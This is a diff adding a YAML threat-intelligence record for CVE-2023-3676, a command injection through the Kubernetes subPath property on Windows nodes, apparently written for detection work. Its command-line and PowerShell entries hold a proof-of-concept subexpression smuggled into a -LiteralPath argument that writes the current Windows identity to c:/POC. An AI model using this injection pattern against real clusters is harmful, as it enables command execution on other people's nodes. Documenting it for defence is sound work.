@@ -1,0 +1,30 @@
+description: CVE-2023-3676 vulnerability in Kubernetes allows command injection via
+  subPath property on Windows worker nodes.
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - powershell /c (Get-Item -LiteralPath $([System.Security.Principal.WindowsIdentity]::GetCurrent()>c:/POC)).LinkType
+  powershell:
+  - (Get-Item -LiteralPath $([System.Security.Principal.WindowsIdentity]::GetCurrent()>c:/POC)).LinkType
+  - Out-File -FilePath "c:\\POC" -InputObject "System.Security.Principal.WindowsIdentity"
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections: []
+  file_activity:
+  - c:/POC
+  persistence: []
+  process_relations: []
+CVEs:
+- CVE-2023-3676
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls: []
+authors:
+- Zander Mackie
+reference: https://securitylabs.datadoghq.com/articles/kubernetes-cve-2023-3676
+date_of_publication: October 27, 2023
+file_creation_date: December 23, 2025
